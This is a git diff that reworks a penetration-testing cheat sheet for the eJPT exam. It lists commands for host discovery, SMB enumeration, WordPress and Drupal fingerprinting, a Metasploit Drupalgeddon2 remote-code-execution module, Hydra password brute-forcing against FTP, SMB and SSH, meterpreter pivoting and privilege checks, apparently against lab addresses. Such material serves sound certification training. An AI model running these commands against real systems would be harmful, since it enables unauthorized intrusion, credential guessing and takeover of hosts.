@@ -5,124 +5,127 @@ This cheat sheet is a list of commands to help with the eJPT.
 *** FOR A DEEP DIVE REFER TO: ***
 
 ----------------------------------------------------------------------------------------------------------------------
-
-📡 Phase 1: Deep Discovery & Network Mapping
+Phase 1: Deep Discovery & Network Mapping
 Host Discovery
-Identify live hosts using ARP discovery
-netdiscover -r 10.11.12.0/24
+Identify live hosts using ARP discovery or ICMP sweeps.
 
-Find live hosts using fping and save to a file
+# ARP Scan
+netdiscover -r 10.11.12.0/24 
+
+# ICMP/Ping Sweep
 fping -a -g 10.11.12.0/24 2>/dev/null | tee scans.txt
-
 Nmap Mastery
-Comprehensive scan for all ports, OS, and service versions
+Comprehensive scanning for ports, services, and OS versions.
+
+# Aggressive Full Port Scan
 nmap -sV -sC -O -A -p- -T4 10.11.12.13
 
-Identify specific Windows server instances in scan results
+# Filter results for specific Windows versions
 grep -i "windows server xxxx" full_scan.txt
 
-Infrastructure
-Add virtual hosts to access web services by name
+# Add virtual hosts
 sudo nano /etc/hosts
+# Format: 10.11.12.13  wordpress.local
 
-<Add the IP and Name, e.g., 10.11.12.13 wordpress.local>
-🪟 Phase 2: SMB & RPC Enumeration
+Phase 2: SMB & RPC Enumeration
 Share Enumeration
-List all available shares anonymously (Null Session)
+Check for accessible files and directories.
+
+# List shares anonymously (Null Session)
 smbclient -L //10.11.12.13 -N
 
-Map shares and list permissions for a specific user
-smbmap -H 10.11.12.13 -u user -p ""
+# Map permissions for a specific user
+smbmap -H 10.11.12.13 -u user -p "password123"
 
-Deep Dive Enumeration
-Comprehensive Windows/Samba enumeration (Users, Shares, OS details)
+# Comprehensive Windows enumeration
 enum4linux -a 10.11.12.13
 
-Connect to a specific SMB share as a valid user
+# Connect to a specific share
 smbclient //10.11.12.13/Users -U user
 
-🌐 Phase 3: Web Application & CMS Exploitation
+
+Phase 3: Web Application & CMS Exploitation
 WordPress & Drupal
-Inspect headers for locations and redirects
+Fingerprinting and user enumeration for specific CMS platforms.
+
+# Inspect HTTP headers
 curl -I http://10.11.12.13/wp-login.php
 
-Enumerate WordPress users and vulnerable plugins
+# Enumerate WP users and plugins
 wpscan --url http://wordpress.local --enumerate u,vp
 
-Brute force WordPress login via XML-RPC
-wpscan --url http://wordpress.local/ -U user -P /usr/share/wordlists/rockyou.txt
-
-Identify Drupal version from the CHANGELOG
+# Drupal Version Identification
 curl http://10.11.12.13/drupal/CHANGELOG.txt
 
-Metasploit Framework
-Bash
-# Basic Flow
+# Start Framework
 msfconsole
-search <vulnerability_name>
-use <exploit_number>
-show options
-set RHOSTS 10.11.12.13
-set LHOST tun0  # Your VPN IP
-run
-Example: Drupalgeddon2 RCE
-use exploit/unix/webapp/drupal_drupalgeddon2
-set TARGETURI /drupal/
 
-🔑 Phase 4: Password Cracking (Hydra)
-Brute force FTP
+# Drupalgeddon2 RCE (Example)
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS 10.11.12.13
+set LHOST tun0
+set TARGETURI /drupal/
+run
+
+
+Phase 4: Password Cracking (Hydra)
+Network Brute Force
+Automated login attempts against standard protocols.
+
+# FTP Brute Force
 hydra -l user -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ftp
 
-Brute force SMB
+# SMB Brute Force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 smb
 
-Brute force SSH
+# SSH Brute Force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ssh
 
-🖥️ Phase 5: Remote Access & SQL
+
+Phase 5: Remote Access & SQL
 RDP (Remote Desktop)
-Standard RDP connection
+
+# Standard Connection
 xfreerdp /u:admin /p:xyz /v:10.11.12.13 /cert-ignore
 
-Enhanced RDP (Dynamic resolution & clipboard)
+# Enhanced Connection (Clipboard & Dynamic Res)
 xfreerdp /v:10.11.12.13 /u:admin /p:xyz /dynamic-resolution +clipboard /cert-ignore
 
-SQL Databases
-Login to MySQL with specific port
+# Remote Login
 mysql --user=root --port=13306 -p -h 10.11.12.13
 
-Common SQL Commands
+# Database Queries
 SHOW databases;
 use <db_name>;
-SHOW tables;
 SELECT * FROM <table_name>;
 
-🚀 Phase 6: Pivoting & Internal Enumeration
-Routing & Ports
-View routing tables (Linux/Windows)
-ip route / route print
+Phase 6: Pivoting & Internal Enumeration
+Routing & Connections
 
-View active connections and listening ports
-netstat -tulpn (Linux) / netstat -ano (Windows)
+# View routing tables
+ip route
+route print
 
-Add a manual network route (Linux)
+# Check active ports
+netstat -tulpn # Linux
+netstat -ano   # Windows
+
+# Manual Linux Route
 sudo ip route add 10.10.10.0/24 via 10.11.12.13
 
-Metasploit Pivoting
-Add an internal route through a compromised session
+# Add internal route
 meterpreter > route add 172.16.1.0 255.255.255.0 1
 
-🏆 Phase 7: Post-Exploitation & PrivEsc
-Privilege Checks
-List Windows user privileges (Check for SeImpersonate)
+
+Phase 7: Post-Exploitation & PrivEsc
+Privilege & System Checks
+
+# Check Windows Privs
 whoami /priv
 
-List members of the local Administrators group
-net localgroup administrators
-
-Identify Linux hashing algorithm (SHA-512)
+# Linux Hash Algorithm Check
 grep "ENCRYPT_METHOD" /etc/login.defs
 
-Flag Hunting
-Search for flags in Windows user directories
-dir C:\Users\abc\Documents\flag.txt
+# Locate flags
+dir C:\Users\mike\Documents\flag.txt
+cat /home/auditor/flag.txt
